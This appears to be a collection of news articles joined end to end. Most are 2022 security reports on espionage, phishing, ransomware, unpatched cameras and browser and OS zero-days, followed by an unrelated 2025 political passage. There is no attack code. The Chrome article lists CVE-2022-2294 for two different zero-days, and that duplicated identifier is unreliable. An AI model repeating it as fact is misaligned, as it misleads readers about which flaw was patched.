them. This technique is often called browser fingerprinting.\nThe primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.\n“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.\nAdversaries can then leverage a technology called\nSTUN\n(Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.\n“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of\nInteractive Connectivity Establishment\n(ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.\n“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.\nThreat Actors\nThe threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”\nThe group has, in the past, expanded well beyond Australasia. According to a Department of Justice\nindictment\nfrom July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”\nDespite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”\nShare this article:\nMalware",

The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.\n“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers\nin a recent report\n. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”\nImpacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.\nRoberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.\nWhat the 0ktapus Hackers Wanted\nThe 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.\nWhile unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.\n“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.\nNext, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.\nIn an accompanying\ntechnical blog\n, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.\nIn a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.\nBlast Radius: MFA Attacks\nIn a\nblog post\nDoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.\nIn the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.\n“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.\n“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”\nTo mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using\nFIDO2\n-compliant security keys for MFA.\n“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”\nShare this article:\nHacks\nPrivacy",

According to\ndata\nreleased by\nNCC Group, the resurgence is being led by old ransomware-as-a-service (RaaS) groups.\nWith data gathered by “actively monitoring the leak sites used by each ransomware group and scraping victim details as they are released,” researchers have determined that Lockbit was by far the most prolific ransomware gang in July, behind 62 attacks. That’s ten more than the month prior, and more than twice as many as the second and third most prolific groups combined. “Lockbit 3.0 maintain their foothold as the most threatening ransomware group,” the authors wrote, “and one with which all organizations should aim to be aware of.”\nThose second and third most prolific groups are Hiveleaks – 27 attacks – and BlackBasta – 24 attacks. These figures represent rapid rises for each group – since June, a 440 percent rise for Hiveleaks, and a 50 percent rise for BlackBasta.\nIt may well be that the resurgence in ransomware attacks, and the rise of these two particular groups, are intimately connected.\nWhy Ransomware Has Bounced\nResearchers from NCC Group counted 198 successful ransomware campaigns in July – up 47 percent from June. Sharp as that incline may be, it still falls some ways short of the high-water mark set this Spring, with nearly 300 such campaigns in both March and April.\nWhy the Flux?\nWell, in May, the United States government ramped up its efforts against Russian cybercrime by\noffering\nup to $15 million for prized information about Conti, then the world’s foremost ransomware gang. “It is likely that the threat actors that were undergoing structural changes,” the authors of the report speculated, “and have begun settling into their new modes of operating, resulting in their total compromises increasing in conjunction.”\nHiveleaks and BlackBasta are the result of that restructuring. Both groups are “associated with Conti,” the authors noted, Hiveleaks as an affiliate and BlackBasta as a replacement strain. “As such, it appears that it has not taken long for Conti’s presence to filter back into the threat landscape, albeit under a new identity.”\nNow that Conti’s properly split in two, the authors speculated, “it would not be surprising to see these figures further increase as we move into August.”\nShare this article:\nMalware\nVulnerabilities",

        "content": "Cybercriminals Are Selling Access to Chinese Surveillance Cameras\nAuthor:\nNate Nelson\nAugust 25, 2022\n2:47 pm\nminute read\nShare this article:\nTens of thousands of cameras have failed to patch a critical, 11-month-old CVE, leaving thousands of organizations exposed.\nNew\nresearch\nindicates that over 80,000 Hikvision surveillance cameras in the world today are vulnerable to an 11 month-old command injection flaw.\nHikvision – short for Hangzhou Hikvision Digital Technology – is a Chinese state-owned manufacturer of video surveillance equipment. Their customers span over 100 countries (including the United States, despite the FCC labeling Hikvision “an unacceptable risk to U.S. national security” in 2019).\nLast Fall, a command injection flaw in Hikvision cameras was revealed to the world as\nCVE-2021-36260\n. The exploit was given a “critical” 9.8 out of 10 rating by NIST.\nDespite the severity of the vulnerability, and nearly a year into this story, over 80,000 affected devices remain unpatched. In the time since, the researchers have discovered “multiple instances of hackers looking to collaborate on exploiting Hikvision cameras using the command injection vulnerability,” specifically in Russian dark web forums, where leaked credentials have been put up for sale.\nThe extent of the damage done already is unclear. The authors of the report could only speculate that “Chinese threat groups such as MISSION2025/APT41, APT10 and its affiliates, as well as unknown Russian threat actor groups could potentially exploit vulnerabilities in these devices to fulfill their motives (which may include specific geo-political considerations).”\nThe Risk in IoT Devices\nWith stories like this, it’s easy to ascribe laziness to individuals and organizations that leave their software unpatched. But the story isn’t always so simple.\nAccording to David Maynor, senior director of threat intelligence at Cybrary, Hikvision cameras have been vulnerable for many reasons, and for a while. “Their product contains easy to exploit systemic vulnerabilities or worse, uses default credentials. There is no good way to perform forensics or verify that an attacker has been excised. Furthermore, we have not observed any change in Hikvision’s posture to signal an increase in security within their development cycle.”\nA lot of the problem is endemic to the industry, not just Hikvision. “IoT devices like cameras aren’t always as easy or straightforward to secure as an app on your phone,” Paul Bischoff, privacy advocate with Comparitech, wrote in a statement via email. “Updates are not automatic; users need to manually download and install them, and many users might never get the message. Furthermore, IoT devices might not give users any indication that they’re unsecured or out of date. Whereas your phone will alert you when an update is available and likely install it automatically the next time you reboot, IoT devices do not offer such conveniences.”\nWhile users are none the wiser, cybercriminals can scan for their vulnerable devices with search engines like Shodan or Censys. The problem can certainly be compounded with laziness, as Bischoff noted, “by the fact that Hikvision cameras come with one of a few predetermined passwords out of the box, and many users don’t change these default passwords.”\nBetween weak security, insufficient visibility and oversight, it’s unclear when or if these tens of thousands of cameras will ever be secured.\nShare this article:\nIoT\nPrivacy\nVulnerabilities",

In a letter to employees\nTwitter’s CEO Parag Agrawal\nasserts that Zatko’s claims are a “false narrative that is riddled with inconsistencies and inaccuracies, and presented without important context.”\nHere is an abbreviated overview of the allegations and Twitter’s reaction.\nAllegations\nZatko, a respected white-hat hacker who served as Twitter’s head of security for roughly 15 months between 2020 and 2022\n,\naccused Twitter of a litany of poor security and privacy practices that together constituted a national security risk.\nTop accusations include:\nTwitter is a mismanaged company and gives too many of its staff access to sensitive security and privacy controls without adequate oversight.\nOne or more Twitter employees may be working for undisclosed foreign intelligence services. This, according to Zatko, elevates his concerns to a matter of national security.\nNearly half of Twitter’s servers lack basic security features, such as data encryption, because software running on them is either outdated or unpatched.\nTwitter executives have prioritized growth over security as they have personally pursued massive bonuses, as high as $10 million, as incentives for the company’s rapid expansion.\nThe company is out of compliance with a 2010\nFTC order\nto protect users’ personal information. Additionally, the company has lied to independent auditors of an FTC mandated “comprehensive information security program”\ntied to the 2010 order\n.\nTwitter does not honor user requests to delete their personal data, because of technical limitations.\nWhen Zatko attempted to bring these and many other security and privacy issues to Twitter’s board, company management misrepresented his finding and/or tried to hide the report.\nTwitter allowed some foreign governments “… to infiltrate, control, exploit, surveil and/or censor the ‘company’s platform, staff, and operations,” according to the\nredacted whistleblower report submitted to congress\n.\nTwitter does not have the resources or capacity to accurately determine the true number of fake (or bot) accounts on its platform. This question is central to a Elon Musk’s attempt to back out of buying the company for $44 billion.\nTwitter’s\nMuted\nResponse\nThe thrust of Twitter’s response to Zatko is that he is a disgruntled employee, bad at his job and scapegoating Twitter for his failures. It points out that it has addressed and continues to aggressively address many of the IT security issues pointed out by Zatko.\nAn alleged response by Twitter’s\nCEO Parag Agrawal\nsent internally to Twitter employees was posted online.\nNEW: First time Twitter CEO\n@paraga\nweighs in on whistleblower story.\nSending this message to staff this morning.\npic.twitter.com/WY4TCqbA5q\n— Donie O'Sullivan (@donie)\nAugust 23, 2022\nMeanwhile top Democrats and Republicans in Congress have reacted by promising to investigate the claims. Sen. Richard Durbin (D-IL), chair of the Senate Judiciary Committee, confirmed he was investigating the whistleblower disclosure.\nThe whistleblower’s allegations of widespread security failures at Twitter, willful misrepresentations by top executives to government agencies, and penetration of the company by foreign intelligence raise serious concerns.\nhttps://t.co/9QQtlDSogr\n— Senator Dick Durbin (@SenatorDurbin)\nAugust 23, 2022\nShare this article:\nGovernment\nPrivacy",

        "content": "Firewall Bug Under Active Attack Triggers CISA Warning\nAuthor:\nThreatpost\nAugust 23, 2022\n9:19 am\nminute read\nShare this article:\nCISA is warning that Palo Alto Networks’ PAN-OS is under active attack and needs to be patched ASAP.\nSoftware running Palo Alto Networks’ firewalls is under attack, prompting U.S. Cybersecurity and Infrastructure Security Agency (CISA) to issue a warning to public and federal IT security teams to apply available fixes. Federal agencies urged to patch the bug by September 9.\nEarlier this month, Palo Alto Networks issued a fix for the high-severity bug (CVE-2022-0028) that it says adversaries attempted to exploit. The flaw could be used by remote hackers to carry out reflected and amplified denial-of-service (DoS) attacks without having to authenticate targeted systems.\nPalo Alto Networks maintains the flaw can only be exploited on a limited number of systems, under certain conditions and that the vulnerable systems are not part of a common firewall configuration. Any additional attacks exploiting the bug have either not occurred or been publicly reported.\nAffected Products and OS Versions\nAffected products include those running the PAN-OS firewall software include PA-Series, VM-Series and CN-Series devices. PAN-OS versions vulnerable to attack, with patches available, include PAN-OS prior to 10.2.2-h2, PAN-OS prior to 10.1.6-h6, PAN-OS prior to 10.0.11-h1, PAN-OS prior to 9.1.14-h4, PAN-OS prior to 9.0.16-h3 and PAN-OS prior to 8.1.23-h1.\nAccording to\nPalo Alto Networks advisory\n; “A PAN-OS URL filtering policy misconfiguration could allow a network-based attacker to conduct reflected and amplified TCP denial-of-service (RDoS) attacks. The DoS attack would appear to originate from a Palo Alto Networks PA-Series (hardware), VM-Series (virtual) and CN-Series (container) firewall against an attacker-specified target.”\nThe advisory describes the non-standard configuration at risk as the “firewall configuration must have a URL filtering profile with one or more blocked categories assigned to a security rule with a source zone that has an external facing network interface.”\nThe configuration is likely unintended by the network administrator, the advisory said.\nCISA Adds Bug to KEV Catalog\nOn Monday, CISA added the Palo Alto Networks bug to its list of\nKnown Exploited Vulnerabilities Catalog\n.\nThe CISA Known Exploited Vulnerabilities (\nKEV\n) Catalog is a curated list of flaws that have been exploited in the wild. It is also a list of KEVs that the agency “strongly recommends” public and private organizations pay close attention to in order to “prioritize remediation” to “reduce the likelihood of compromise by known threat actors.”\nReflective and Amplification DoS Attacks\nOne of the most notable evolutions in the DDoS landscape is the growth in the peak size of volumetric attacks. Attackers continue to use reflection/amplification techniques to exploit vulnerabilities in DNS, NTP, SSDP, CLDAP, Chargen and other protocols to maximize the scale of their attacks.\nReflected and amplified denial-of-service attacks are not new and have steadily become\nmore common over the years\n.\nDistributed denial of service attacks, bent on taking websites offline by overwhelming domains or specific application infrastructure with massive traffic flows, continue to pose a major challenge to businesses of all stripes. Being knocked offline impacts revenue, customer service and basic business functions – and worryingly, the bad actors behind these attacks are honing their approaches to become ever more successful over time.\nUnlike limited volume DDoS attacks, reflective and amplified DoS attacks can produce much higher volumes of disruptive traffic. This type of attack allows an adversary to magnify the amount of malicious traffic they generate while obscuring the sources of the attack traffic. An HTTP-based DDoS attack, for example, sends junk HTTP requests to a target’s server tying up resources and locking out users from using a particular site or service.\nA TCP attack, believed used in the recent Palo Alto Networks attack, is when an attacker sends a spoofed SYN packet, with the original source IP replaced by the victim’s IP address, to a range of random or pre-selected reflection IP addresses. The services at the reflection addresses reply with a SYN-ACK packet to the victim of the spoofed attack. If the victim does not respond, the reflection service will continue to retransmit the SYN-ACK packet, resulting in amplification. The amount of amplification depends on the number of SYN-ACK retransmits by the reflection service, which can be defined by the attacker.\nShare this article:\nVulnerabilities\nWeb Security",

        "content": "Fake Reservation Links Prey on Weary Travelers\nAuthor:\nNate Nelson\nAugust 22, 2022\n9:59 am\nminute read\nShare this article:\nFake travel reservations are exacting more pain from the travel weary, already dealing with the misery of canceled flights and overbooked hotels.\nA longtime threat group identified as TA558 has ramped up efforts to target the travel and hospitality industries. After a lull in activity, believed tied to COVID-related travel restrictions, the threat group has ramped up campaigns to exploit an uptick in travel and related airline and hotel bookings.\nWarnings come from security researchers who say TA558 cybercriminals have revamped their 2018 campaigns with fake reservation emails that contain links – that if clicked – deliver a malicious malware payload containing a potpourri of malware variants.\nWhat makes this most recent campaign unique, according to a report by\nProofpoint\n, is the use of RAR and ISO file attachments linked to messages. ISO and RAR are single compressed files, that if executed, decompress the file and folder data inside of them.\n“TA558 began using URLs more frequently in 2022. TA558 conducted 27 campaigns with URLs in 2022, compared to just five campaigns total from 2018 through 2021. Typically, URLs led to container files such as ISOs or zip [RAR] files containing executables,” Proofpoint wrote.\nTo become infected, the targeted victim would have to be tricked into decompressing the file archive. “The reservation link… led to an ISO file and an embedded batch file. The execution of the BAT file led to a PowerShell helper script that downloaded a follow-on payload, AsyncRAT,” researchers wrote.\nUpgrade Your Itinerary To Malware Infection Status\nPast TA558 campaigns, tracked by Palo Alto Networks (\nin 2018\n), Cisco Talos (\nin 2020\nand\n2021\n) and Uptycs (\nin 2020\n), have leveraged malicious Microsoft Word document attachments (CVE-2017-11882) or remote template URLs to download and install malware, according to Proofpoint.\nThe shift to ISO and RAR files “is likely due to Microsoft’s announcements in late 2021 and early 2022 about disabling macros [VBA and XL4] by default in Office products,” researchers said.\n“In 2022, campaign tempo increased significantly. Campaigns delivered a mixture of malware such as, Loda, Revenge RAT, and AsyncRAT. This actor used a variety of delivery mechanisms including URLs, RAR attachments, ISO attachments, and Office documents,” researchers wrote.\nMalware payloads of recent campaigns typically include remote access trojans (RATs), that can enable reconnaissance, data theft and distribution of follow-on payloads, Proofpoint said.\nThrough all their evolutions, though, the goal of the group has always remained the same. The analysts concluded “with medium to high confidence” that TA558 is financially motivated, using stolen data to scale up and steal money. “Its possible compromises could impact both organizations in the travel industry as well as potentially customers who have used them for vacations,” Sherrod DeGrippo, vice president of threat research and detection organizations at Proofpoint, wrote in a statement. “Organizations in these and related industries should be aware of this actor’s activities and take precautions to protect themselves.”\nTA558’s History\nSince at least 2018, TA558 has primarily targeted organizations in the fields of travel, hospitality, and related industries. Those organizations tend to be located in Latin America, and sometimes in North America or Western Europe.\nThroughout their history, TA558 has used socially engineered emails to lure victims into clicking on malicious links or documents. Those emails – most often written in Portuguese or Spanish – usually purported to concern hotel reservations. The subject line, or the name of the attached document, was often, simply, “reserva.”\nIn their early exploits, the group would leverage vulnerabilities in Microsoft Word’s Equation Editor – for example,\nCVE-2017-11882\n, a remote code execution bug. The goal was to download a RAT – most commonly\nLoda\nor\nRevenge RAT\n– to the target machine.\nIn 2019 the group expanded its arsenal, with malicious macro-laced Powerpoint attachments and template injections against Office documents. They also expanded to new demographics, utilizing English-language phishing lures for the first time.\nEarly 2020 was TA558’s most prolific period, as they churned out 25 malicious campaigns in January alone. They predominantly used macro-laden Office documents, or targeted known Office vulnerabilities during this period.\n“Organizations, especially those operating in targeted sectors in Latin America, North America, and Western Europe should be aware of this actor’s tactics, techniques, and procedures,” researchers advise.\nShare this article:\nMalware\nWeb Security",

The patches are for vulnerabilities that allow attackers to execute arbitrary code and ultimately take over devices.\nPatches are available for effected devices running\niOS 15.6.1\nand\nmacOS Monterey 12.5.1\n. Patches address two flaws, which basically impact any Apple device that can run either iOS 15 or the Monterey version of its desktop OS, according to security updates released by Apple Wednesday.\nOne of the flaws is a kernel bug (\nCVE-2022-32894\n), which is present both in iOS and macOS. According to Apple it is an “out-of-bounds write issue [that] was addressed with improved bounds checking.”\nThe vulnerability allows an application to execute arbitrary code with kernel privileges, according to Apple, which, in usual vague fashion, said there is a report that it “may have been actively exploited.”\nThe second flaw is identified as a WebKit bug (tracked as CVE-2022-32893), which is an out-of-bounds write issue that Apple addressed with improved bounds checking. The flaw allows for processing maliciously crafted web content that can lead to code execution, and also has been reported to be under active exploit, according to Apple. WebKit is the browser engine that powers Safari and all other third-party browsers that work on iOS.\nPegasus-Like Scenario\nThe discovery of both flaws, about which little more beyond Apple’s disclosure are known, was credited to an anonymous researcher.\nOne expert expressed worry that the latest Apple flaws “could effectively give attackers full access to device,” they might create a\nPegasus-like\nscenario similar to the one in which nation-state APTs barraged targets\nwith spyware\nmade by Israeli NSO Group by exploiting an iPhone vulnerability.\n“For most folks: update software by end of day,”\ntweeted\nRachel Tobac, the CEO of SocialProof Security, regarding the zero-days. “If threat model is elevated (journalist, activist, targeted by nation states, etc): update now,” Tobac warned.\nZero-Days Abound\nThe flaws were unveiled alongside other news from Google this week that it\nwas patching\nits fifth zero-day so far this year for its Chrome browser, an arbitrary code execution bug under active attack.\nThe news of yet more vulnerabilities from top tech vendors being barraged by threat actors demonstrates that despite the best efforts from top-tier tech companies to address perennial security issues in their software, it remains an uphill battle, noted Andrew Whaley, senior technical director at\nPromon\n, a Norwegian app security company.\nThe flaws in iOS are especially worrying, given the ubiquity of iPhones and users’ utter reliance on mobile devices for their daily lives, he said. However, the onus is not only on vendors to protect these devices but also for users to be more aware of existing threats, Whaley observed.\n“While we all rely on our mobile devices, they are not invulnerable, and as users we need to maintain our guard just like we do on desktop operating systems,” he said in an email to Threatpost.\nAt the same time, developers of apps for iPhones and other mobile devices also should add an extra layer of security controls in their technology so they are less reliant on OS security for protection, given the flaws that frequently crop up, Whaley observed.\n“Our experience shows that this is not happening enough, potentially leaving banking and other customers vulnerable,” he said.\nShare this article:\nHacks\nMobile Security\nNews\nVulnerabilities",

        "content": "Google Patches Chrome’s Fifth Zero-Day of the Year\nAuthor:\nElizabeth Montalbano\nAugust 18, 2022\n10:31 am\nminute read\nShare this article:\nAn insufficient validation input flaw, one of 11 patched in an update this week, could allow for arbitrary code execution and is under active attack.\nGoogle has patched the fifth actively exploited zero-day vulnerability discovered in Chrome this year as one in a series of fixes included in a stable channel update released Wednesday.\nThe bug, tracked as\nCVE-2022-2856\nand rated as high on the Common Vulnerability Scoring System (CVSS), is associated with “insufficient validation of untrusted input in Intents,” according to\nthe advisory\nposted by Google.\nGoogle credits Ashley Shen and Christian Resell of its Google Threat Analysis Group (TAG) for reporting the zero-day bug, which could allow for arbitrary code execution, on July 19. The advisory also unveiled 10 other patches for various other Chrome issues.\nIntents are a deep linking feature on the Android device within the Chrome browser that replaced URI schemes, which previously handled this process,\naccording to Branch\n, a company that offers various linking options for mobile applications.\n“Instead of assigning window.location or an iframe.src to the URI scheme, in Chrome, developers need to use their intent string as defined in this document,” the company explained on its website. Intent “adds complexity” but “automatically handles the case of the mobile app not being installed” within links, according to the post.\nInsufficient validation is associated with input validation, a frequently-used technique for checking potentially dangerous inputs to ensure that they are safe for processing within the code, or when communicating with other components,\naccording to MITRE’s Common Weakness Enumeration site\n.\n“When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application,” according to a post on the site. “This will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution.”\nFending Off Exploits\nAs is typical, Google did not disclose specific details of the bug until it is widely patched to avoid threat actors taking further advantage of it, a strategy that one security professional noted is a wise one.\n“Publicizing details on an actively exploited zero-day vulnerability just as a patch becomes available could have dire consequences, because it takes time to roll out security updates to vulnerable systems and attackers are champing at the bit to exploit these types of flaws,” observed Satnam Narang, senior staff research engineer at cybersecurity firm\nTenable,\nin an email to Threatpost.\nHolding back info is also sound given that other Linux distributions and browsers, such as Microsoft Edge, also include code based on Google’s Chromium Project. These all could be affected if an exploit for a vulnerability is released, he said.\n“It is extremely valuable for defenders to have that buffer,” Narang added.\nWhile the majority of the fixes in the update are for vulnerabilities rated as high or medium risk, Google did patch a critical bug tracked as\nCVE-2022-2852\n, a use-after-free issue in FedCM reported by Sergei Glazunov of Google Project Zero on Aug. 8. FedCM—short for the Federated Credential Management API–provides a use-case-specific abstraction for federated identity flows on the web,\naccording to Google\n.\nFifth Chrome 0Day Patch So Far\nThe zero-day patch is the fifth Chrome bug under active attack that Google has patched so far this year.\nIn July, the company fixed an\nactively exploited heap buffer overflow flaw\ntracked as\nCVE-2022-2294\nin WebRTC, the engine that gives Chrome its real-time communications capability, while in May it was a separate buffer overflow flaw tracked as\nCVE-2022-2294\nand under active attack that got slapped with a patch.\nIn April, Google patched\nCVE-2022-1364\n, a type confusion flaw affecting Chrome’s use of the V8 JavaScript engine on which attackers already had pounced. The previous month a separate type-confusion issue in V8 tracked as\nCVE-2022-1096\nand under active attack also\nspurred a hasty patch\n.\nFebruary saw a fix for the first of this year’s Chrome zero-days, a use-after-free flaw in Chrome’s Animation component tracked as\nCVE-2022-0609\nthat already\nwas under attack\n. Later\nit was revealed\nthat North Korean hackers were exploiting the flaw weeks before it was discovered and patched.\nShare this article:\nVulnerabilities\nWeb Security",

But that right is being assaulted by this administration on multiple levels. For starters, many GOP lawmakers are now heeding their leadership&#8217;s advice to stay away from local town hall meetings and avoid the wrath of constituents affected by the administration&#8217;s many federal budget and workforce cuts.</p>\n<p>Another example: President Trump recently <a href=\"https://www.cnn.com/2025/02/18/politics/opm-privacy-team-fired/index.html\" rel=\"noopener\" target=\"_blank\">fired most of the people</a> involved in processing <strong>Freedom of Information Act</strong> (FOIA) requests for government agencies. FOIA is an indispensable tool used by journalists and the public to request government records, and to hold leaders accountable.</p>\n<p>The biggest story by far this week was the bombshell from The Atlantic editor <strong>Jeffrey Goldberg</strong>, who recounted how he was <a href=\"https://www.theatlantic.com/politics/archive/2025/03/trump-administration-accidentally-texted-me-its-war-plans/682151/?gift=DjgA9DZGvABas7wFCM-ptk0vpPuikYUZT9Ej3cJbK1s&amp;utm_source=copy-link&amp;utm_medium=social&amp;utm_campaign=share\" rel=\"noopener\" target=\"_blank\">inadvertently added to a Signal group chat</a> with <strong>National Security Advisor Michael Waltz</strong> and 16 other Trump administration officials discussing plans for an upcoming attack on Yemen.</p>\n<p>One overlooked aspect of Goldberg&#8217;s incredible account is that by planning and coordinating the attack on Signal &#8212; which features messages that can auto-delete after a short time &#8212; administration officials were evidently seeking a way to avoid creating a lasting (and potentially FOIA-able) record of their deliberations.</p>\n<p>&#8220;Intentional or not, use of Signal in this context was an act of erasure—because without Jeffrey Goldberg being accidentally added to the list, the general public would never have any record of these communications or any way to know they even occurred,&#8221; <strong>Tony Bradley</strong> <a href=\"https://www.forbes.com/sites/tonybradley/2025/03/26/what-everyone-has-missed-about-the-trump-administration-signal-scandal/\" rel=\"noopener\" target=\"_blank\">wrote this week at Forbes</a>.</p>\n<p>Petitioning the government, particularly when it ignores your requests, often requires challenging federal agencies in court. But that becomes far more difficult if the most competent law firms start to shy away from cases that may involve crossing the president and his administration.</p>\n<p>On March 22, the president issued <a href=\"https://www.whitehouse.gov/presidential-actions/2025/03/preventing-abuses-of-the-legal-system-and-the-federal-court/\" rel=\"noopener\" target=\"_blank\">a memorandum</a> that directs heads of the Justice and Homeland Security Departments to &#8220;seek sanctions against attorneys and law firms who engage in frivolous, unreasonable and vexatious litigation against the United States,&#8221; or in matters that come before federal agencies.</p>\n<p>The POTUS recently issued several executive orders railing against specific law firms with attorneys who worked legal cases against him. On Friday, the <a href=\"https://www.bloomberg.com/news/articles/2025-03-28/trump-says-he-s-reached-100-million-pro-bono-deal-with-skadden\" rel=\"noopener\" target=\"_blank\">president announced</a> that the law firm of <strong>Skadden, Arps, Slate, Meager &amp; Flom</strong> had agreed to provide $100 million in pro bono work on issues that he supports.</p>\n<p>Trump issued <a href=\"https://www.whitehouse.gov/presidential-actions/2025/03/addressing-remedial-action-by-paul-weiss/\" rel=\"noopener\" target=\"_blank\">another order</a> naming the firm <strong>Paul, Weiss, Rifkind, Wharton &amp; Garrison</strong>, which ultimately agreed to pledge $40 million in pro bono legal services to the president&#8217;s causes.</p>\n<p>Other Trump executive orders targeted law firms <strong>Jenner &amp; Block</strong> and <strong>WilmerHale</strong>, both of which have attorneys that worked with special counsel Robert Mueller on the investigation into Russian interference in the 2016 election. But this week, two federal judges in separate rulings <a href=\"https://www.cnn.com/2025/03/28/politics/law-firms-fighting-trump-executive-order/index.html\" rel=\"noopener\" target=\"_blank\">froze parts of those orders</a>.</p>\n<p>&#8220;There is no doubt this retaliatory action chills speech and legal advocacy, and that is qualified as a constitutional harm,&#8221; wrote <strong>Judge Richard Leon</strong>, who ruled against the executive order targeting WilmerHale.</p>\n<p>President Trump recently took the extraordinary step of calling for the impeachment of federal judges who rule against the administration. Trump called <strong>U.S. District Judge James Boasberg</strong> <a class=\" js-tealium-tracking \" href=\"https://www.politico.com/news/2025/03/18/trump-impeachment-judge-deportations-00235173\" rel=\"noopener\" target=\"_blank\">a “Radical Left Lunatic”</a> and urged he be removed from office for blocking deportation of Venezuelan alleged gang members under a rarely invoked wartime legal authority.</p>\n<p>In a rare public rebuke to a sitting president, <strong>U.S. Supreme Court Justice John Roberts</strong> <a href=\"https://www.reuters.com/legal/us-chief-justice-roberts-calls-judges-impeachment-are-inappropriate-after-trump-2025-03-18/\" rel=\"noopener\" target=\"_blank\">issued a statement on March 18</a> pointing out that &#8220;For more than two centuries, it has been established that impeachment is not an appropriate response to disagreement concerning a judicial decision.&#8221;</p>\n<p>The U.S. Constitution provides that judges can be removed from office only through impeachment by the House of Representatives and conviction by the Senate. The Constitution also states that judges&#8217; salaries cannot be reduced while they are in office.</p>\n<p>Undeterred, <strong>House Speaker Mike Johnson </strong>this week suggested the administration could still use the power of its purse to keep courts in line, and even <a href=\"https://www.nbcnews.com/now/video/speaker-mike-johnson-floats-possibility-of-congress-eliminating-federal-courts-235397189724\" rel=\"noopener\" target=\"_blank\">floated the idea of wholesale eliminating federal courts</a>.</p>\n<p>&#8220;We do have authority over the federal courts as you know,&#8221; Johnson said. &#8220;We can eliminate an entire district court. We have power of funding over the courts, and all these other things. But desperate times call for desperate measures, and Congress is going to act, so stay tuned for that.&#8221;</p>\n<h2>FREEDOM OF ASSEMBLY</h2>\n<p>President Trump has taken a number of actions to discourage lawful demonstrations at universities and colleges across the country, <a href=\"https://www.reuters.com/world/us/trump-says-federal-funding-will-stop-colleges-schools-allowing-illegal-protests-2025-03-04/\" rel=\"noopener\" target=\"_blank\">threatening to cut federal funding</a> for any college that supports protests he deems &#8220;illegal.&#8221;</p>\n<p>A Trump <a href=\"https://www.whitehouse.gov/presidential-actions/2025/01/additional-measures-to-combat-anti-semitism/\" rel=\"noopener\" target=\"_blank\">executive order in January</a> outlined a broad federal crackdown on what he called &#8220;the explosion of antisemitism&#8221; on U.S. college campuses. This administration has asserted that foreign students who are lawfully in the United States on visas do not enjoy the same free speech or due process rights as citizens.</p>\n<p><strong>Reuters</strong> reports that the acting civil rights director at the <strong>Department of Education</strong> <a href=\"https://www.ed.gov/about/news/press-release/us-department-of-educations-office-civil-rights-sends-letters-60-universities-under-investigation-antisemitic-discrimination-and-harassment\" rel=\"noopener\" target=\"_blank\">on March 10 sent letters to 60 educational institutions</a> warning they could lose federal funding if they don&#8217;t do more to combat anti-semitism. On March 20, Trump issued an order calling for <a href=\"https://www.ed.gov/about/news/press-release/statement-president-trumps-executive-order-return-power-over-education-states-and-local-communities\" rel=\"noopener\" target=\"_blank\">the closure of the Education Department</a>.</p>\n<p>Meanwhile, 